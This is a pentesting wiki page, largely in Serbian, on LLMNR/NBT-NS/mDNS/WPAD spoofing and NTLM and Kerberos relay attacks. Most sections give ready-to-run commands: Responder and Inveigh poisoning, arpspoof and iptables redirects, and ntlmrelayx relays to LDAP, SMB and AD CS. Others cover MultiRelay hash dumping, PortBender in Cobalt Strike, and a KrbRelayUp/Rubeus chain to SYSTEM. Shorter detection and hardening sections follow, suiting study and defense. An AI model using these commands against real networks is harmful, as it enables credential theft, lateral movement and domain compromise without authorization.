# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Mrežni protokoli

### Lokalni protokoli za rezoluciju imena

- **LLMNR, NBT-NS, and mDNS**:
- Microsoft i drugi operativni sistemi koriste LLMNR i NBT-NS za lokalno razrešavanje imena kada DNS ne uspe. Slično tome, Apple i Linux sistemi koriste mDNS.
- Ovi protokoli su podložni presretanju i spoofingu zbog njihovog neautentifikovanog, broadcast karaktera preko UDP.
- [Responder](https://github.com/lgandx/Responder) se može koristiti za lažno predstavljanje servisa slanjem falsifikovanih odgovora hostovima koji upituju te protokole.
- Dalje informacije o lažnom predstavljanju servisa pomoću Responder-a mogu se naći [ovde](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Protokol automatskog otkrivanja web proxy-ja (WPAD)

- WPAD omogućava pregledačima da automatski otkriju podešavanja proxy-ja.
- Otkrivanje se vrši preko DHCP, DNS, ili se vraća na LLMNR i NBT-NS ako DNS ne uspe.
- Responder može automatizovati WPAD napade, usmeravajući klijente prema zlonamernim WPAD serverima.

### Responder za trovanje protokola

- **Responder** je alat koji se koristi za trovanje upita LLMNR, NBT-NS i mDNS, selektivno odgovarajući na osnovu tipova upita, prvenstveno ciljajući SMB servise.
- Dolazi predinstaliran u Kali Linux, konfigurisano u `/etc/responder/Responder.conf`.
- Responder prikazuje uhvaćene heševe na ekranu i beleži ih u direktorijumu `/usr/share/responder/logs`.
- Podržava i IPv4 i IPv6.
- Windows verzija Responder-a je dostupna [ovde](https://github.com/lgandx/Responder-Windows).

#### Pokretanje Responder-a

- Za pokretanje Responder-a sa podrazumevanim podešavanjima: `responder -I <Interface>`
- Za agresivnije sondiranje (sa mogućim posledicama): `responder -I <Interface> -P -r -v`
- Tehnike za hvatanje NTLMv1 izazova/odgovora radi lakšeg crack-ovanja: `responder -I <Interface> --lm --disable-ess`
- Lažno predstavljanje WPAD-a može se aktivirati sa: `responder -I <Interface> --wpad`
- NetBIOS zahteve je moguće resolvovati na IP napadača, i može se postaviti autentikacioni proxy: `responder.py -I <interface> -Pv`

### DHCP trovanje pomoću Responder-a

- Lažiranje DHCP odgovora može trajno zatrovati ruting informacije žrtve, nudeći prikriveniju alternativu ARP poisoning-u.
- Zahteva precizno znanje o konfiguraciji ciljne mreže.
- Za izvođenje napada: `./Responder.py -I eth0 -Pdv`
- Ova metoda može efikasno uhvatiti NTLMv1/2 heševe, ali zahteva pažljivu upotrebu kako bi se izbeglo ometanje mreže.

### Hvatanje kredencijala pomoću Responder-a

- Responder će lažno predstavljati servise koristeći gore pomenute protokole, hvatajući kredencijale (obično NTLMv2 Challenge/Response) kada korisnik pokuša da se autentifikuje prema lažno predstavljenim servisima.
- Mogu se pokušati downgrade na NetNTLMv1 ili onemogućiti ESS radi lakšeg probijanja kredencijala.

Veoma je važno napomenuti da se upotreba ovih tehnika treba obavljati legalno i etički, uz odgovarajuće ovlašćenje i izbegavanje ometanja ili neovlašćenog pristupa.

## Inveigh

Inveigh je alat za penetration testere i red teamere, dizajniran za Windows sisteme. Nudi funkcionalnosti slične Responder-u, izvodeći spoofing i man-in-the-middle napade. Alat se razvio iz PowerShell skripte u C# binar, sa [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) i [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) kao glavnim verzijama. Detaljni parametri i uputstva su dostupni u [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh se može pokretati kroz PowerShell:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Ili pokrenuto kao C# binarni fajl:
```bash
Inveigh.exe
```
### NTLM Relay Attack

Ovaj napad koristi SMB autentifikacione sesije da bi se pristupilo ciljnom računaru, dodeljujući system shell ako uspe. Ključni preduslovi uključuju:

- Korisnik koji se autentifikuje mora imati Local Admin pristup na relayed hostu.
- SMB signing treba biti onemogućen.

#### 445 Port Forwarding and Tunneling

U scenarijima gde direktan pristup mreži nije moguć, saobraćaj na portu 445 mora biti prosleđen i tunelovan. Alati poput [**PortBender**](https://github.com/praetorian-inc/PortBender) pomažu u preusmeravanju saobraćaja sa porta 445 na drugi port, što je neophodno kada je dostupan Local Admin pristup za driver loading.

Podešavanje i rad PortBender-a u Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Ostali alati za NTLM Relay Attack

- **Metasploit**: Podešava se sa proxies i podacima o lokalnom i udaljenom hostu.
- **smbrelayx**: Python skripta za relaying SMB sessions i izvršavanje komandi ili postavljanje backdoors.
- **MultiRelay**: Alat iz Responder suite koji može da relay-uje određene korisnike ili sve korisnike, izvršava komande ili dump-uje hashes.

Svaki alat se može konfigurisati da radi kroz SOCKS proxy ako je potrebno, omogućavajući napade čak i sa indirektnim pristupom mreži.

### Korišćenje MultiRelay

MultiRelay se pokreće iz direktorijuma _**/usr/share/responder/tools**_, ciljajući određene IP-ove ili korisnike.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
Ovi alati i tehnike čine sveobuhvatan skup za izvođenje NTLM Relay napada u različitim mrežnim okruženjima.

### Zloupotreba WSUS HTTP (8530) za NTLM Relay prema LDAP/SMB/AD CS (ESC8)

WSUS klijenti se autentifikuju prema svom update serveru koristeći NTLM preko HTTP (8530) ili HTTPS (8531). Kada je HTTP omogućen, periodični check-in klijenata može biti prisiljen ili presretnut na lokalnom segmentu i preusmeren pomoću ntlmrelayx prema LDAP/LDAPS/SMB ili AD CS HTTP endpoint-ima (ESC8) bez razbijanja heševa. Ovo se uklapa u normalni update saobraćaj i često dovodi do autentifikacija računa mašina (HOST$).

Na šta obratiti pažnju
- GPO/registry konfiguracija pod HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate i ...\WindowsUpdate\AU:
- WUServer (npr. http://wsus.domain.local:8530)
- WUStatusServer (reporting URL)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled i DetectionFrequency (sati)
- WSUS SOAP endpoint-i koje klijenti koriste preko HTTP:
- /ClientWebService/client.asmx (approvals)
- /ReportingWebService/reportingwebservice.asmx (status)
- Podrazumevani portovi: 8530/tcp HTTP, 8531/tcp HTTPS

Prikupljanje informacija (Reconnaissance)
- Bez autentikacije
- Skeniraj za slušaoce: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
- Presreći HTTP WSUS saobraćaj preko L2 MITM i zabeleži aktivne klijente/endpoint-e sa wsusniff.py (samo HTTP osim ako ne nateraš klijente da veruju tvom TLS certu).
- Sa autentikacijom
- Analiziraj SYSVOL GPOs za WSUS ključeve pomoću MANSPIDER + regpol (wsuspider.sh wrapper sumira WUServer/WUStatusServer/UseWUServer).
- Upituj endpoint-e na skali sa hostova (NetExec) ili lokalno:
nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

Koraci za end-to-end HTTP relay
1) Pozicioniraj se za MITM (isti L2) tako da klijent reši WSUS server na tebe (ARP/DNS poisoning, Bettercap, mitm6, itd.). Primer sa arpspoof:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) Preusmeri port 8530 na tvoj relay listener (opciono, zgodno):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) Pokreni ntlmrelayx sa HTTP listener-om (zahteva Impacket podršku za HTTP listener; vidi PR-ove ispod):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Drugi uobičajeni ciljevi:
- Relay prema SMB (ako je signing isključen) za exec/dump: -t smb://<host>
- Relay prema LDAPS za promene u direktorijumu (npr. RBCD): -t ldaps://<DC>
- Relay prema AD CS web enrollment (ESC8) da bi se izdao cert i kasnije autentifikovalo preko Schannel/PKINIT:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
Za dublje puteve zloupotrebe AD CS i alatke, pogledaj AD CS stranicu:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) Pokreni check-in klijenta ili sačekaj raspored. Sa klijenta:
wuauclt.exe /detectnow
ili koristi Windows Update UI (Check for updates).

5) Iskoristi autentifikovane SOCKS sesije (ako -socks) ili direktne rezultate relay-a za post-eksploataciju (promene u LDAP-u, SMB operacije, ili izdavanje AD CS sertifikata za kasniju autentifikaciju).

Ograničenje HTTPS-a (8531)
- Pasivno presretanje WSUS-a preko HTTPS-a je neefikasno osim ako klijenti ne veruju tvom sertifikatu. Bez pouzdanog sertifikata ili nekog drugog prekida TLS-a, NTLM handshake se ne može prikupiti/proslijediti iz WSUS HTTPS saobraćaja.

Beleške
- WSUS je proglašen zastarelim, ali i dalje široko razmešten; HTTP (8530) je i dalje čest u mnogim okruženjima.
- Korisni alati: wsusniff.py (posmatraj HTTP WSUS check-ine), wsuspider.sh (enumeriši WUServer/WUStatusServer iz GPO-ova), NetExec reg-query na skali.
- Impacket je vratio podršku za HTTP listener u ntlmrelayx u PR #2034 (prvobitno dodat u PR #913).

### Force NTLM Logins

U Windows-u možda možete prisiliti neke privilegovane naloge da se autentifikuju prema proizvoljnim mašinama. Pročitajte sledeću stranicu da naučite kako:


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Kerberos Relay attack

A **Kerberos relay attack** ukrade an **AP-REQ ticket** od jedne usluge i ponovo ga koristi protiv druge usluge koja deli **isti ključ računa mašine** (jer su oba SPN-a postavljena na istom `$` mašinskom nalogu). Ovo funkcioniše iako se **service classes** SPN-ova razlikuju (npr. `CIFS/` → `LDAP/`) jer je *ključ* koji dešifruje tiket NT hash mašine, a ne sam SPN string, i SPN string nije deo potpisa.

Za razliku od NTLM relay, skok je ograničen na *isti host*, ali ako ciljate protokol koji vam omogućava pisanje u LDAP, možete u lancu doći do **Resource-Based Constrained Delegation (RBCD)** ili **AD CS enrollment** i preuzeti **NT AUTHORITY\SYSTEM** u jednom potezu.

Za detaljne informacije o ovom napadu pogledajte:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. **Osnove Kerberosa**

| Token | Svrha | Relay relevance |
|-------|---------|-----------------|
| **TGT / AS-REQ ↔ REP** | Dokazuje korisnika KDC-u | nepromenjeno |
| **Service ticket / TGS-REQ ↔ REP** | Vezan za jedan **SPN**; enkriptovan ključem vlasnika SPN-a | međusobno zamenjivi ako SPN-ovi dele nalog |
| **AP-REQ** | Klijent šalje `TGS` usluzi | **ono što krademo i ponovo koristimo** |

* Tiketi su enkriptovani sa **ključem izvedenim iz lozinke naloga koji je vlasnik SPN-a**.
* **Authenticator** unutar AP-REQ ima vremensku oznaku od 5 minuta; reprodukcija unutar tog prozora važi dok servisni keš ne detektuje duplikat.
* Windows retko proverava da li SPN string u tiketu odgovara servisu koji ciljate, tako da tiket za `CIFS/HOST` obično uspešno dešifruje na `LDAP/HOST`.

- 2. **Šta mora biti ispunjeno za Kerberos relay**

1. **Shared key:** izvorni i ciljni SPN-ovi pripadaju istom računu mašine (podrazumevano na Windows serverima).
2. **No channel protection:** SMB/LDAP signing isključen i EPA isključen za HTTP/LDAPS.
3. **You can intercept or coerce authentication:** LLMNR/NBNS poison, DNS spoof, **PetitPotam / DFSCoerce RPC**, fake AuthIP, rogue DCOM, itd.
4. **Ticket source not already used:** morate pobediti u trci pre nego što stigne pravi paket ili ga potpuno blokirati; u suprotnom servisni replay keš generiše Event 4649.
5. Morate na neki način moći da izvršite **MitM in the communication** — možda biti deo DNSAmins grupe da izmenite DNS domena ili imati mogućnost da promenite HOST fajl žrtve.

### Kerberos Relay Steps - 3.1 **Recon the host**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **Pokrenite relay listener**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp` objedinjava **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass** u jedan binarni fajl.

- 3.3 **Coerce Kerberos auth**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
DFSCoerce natera DC da nam pošalje Kerberos `CIFS/DC01` ticket.

- 3.4 **Prosledi AP-REQ**

KrbRelay izvlači GSS blob iz SMB-a, upakuje ga u LDAP bind i prosleđuje ga na `ldap://DC01` — autentifikacija uspeva jer ga dekriptuje **isti ključ**.

- 3.5 **Iskoristi LDAP ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
Sada posedujete **NT AUTHORITY\SYSTEM**.


### **Još puteva koji vredi znati**

| Vector | Trick | Why it matters |
|--------|-------|----------------|
| **AuthIP / IPSec** | Fake server sends a **GSS-ID payload** with any SPN; client builds an AP-REQ straight to you | Works even across subnets; machine creds by default |
| **DCOM / MSRPC** | Malicious OXID resolver forces client to auth to arbitrary SPN and port | Čista *lokalna* priv-esc; zaobilazi firewall |
| **AD CS Web Enroll** | Relay machine ticket to `HTTP/CA` and get a cert, then **PKINIT** to mint TGTs | Bypasses LDAP signing defenses |
| **Shadow Credentials** | Write `msDS-KeyCredentialLink`, then PKINIT with forged key pair | No need to add a computer account |

### **Otklanjanje problema**

| Greška | Značenje | Rešenje |
|-------|---------|-----|
| `KRB_AP_ERR_MODIFIED` | Ticket key ≠ target key | Pogrešan host/SPN |
| `KRB_AP_ERR_SKEW` | Clock > 5 min offset | Sinhronizuj vreme ili koristi `w32tm` |
| LDAP bind fails | Signing enforced | Koristi AD CS path ili onemogući potpisivanje |
| Event 4649 spam | Service saw duplicate Authenticator | block or race original packet |


### **Detekcija**

* Nagli porast **Event 4769** za `CIFS/`, `HTTP/`, `LDAP/` sa istog izvora u roku od nekoliko sekundi.
* **Event 4649** na servisu ukazuje na otkriven replay.
* Kerberos prijava sa **127.0.0.1** (relay ka lokalnom SCM) je vrlo sumnjiva — mapiraj preko Sigma pravila u KrbRelayUp docs.
* Prati izmene atributa `msDS-AllowedToActOnBehalfOfOtherIdentity` ili `msDS-KeyCredentialLink`.

## **Ojačavanje**

1. **Enforce LDAP & SMB signing + EPA** na svakom serveru.
2. **Split SPNs** tako da HTTP nije na istom nalogu kao CIFS/LDAP.
3. Zakrpi vektore prinude (PetitPotam KB5005413, DFS, AuthIP).
4. Postavi **`ms-DS-MachineAccountQuota = 0`** da zaustaviš neautorizovana pridruživanja računara.
5. Alertuj na **Event 4649** i neočekivane loopback Kerberos prijave.



## Reference

- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)

{{#include ../../banners/hacktricks-training.md}}
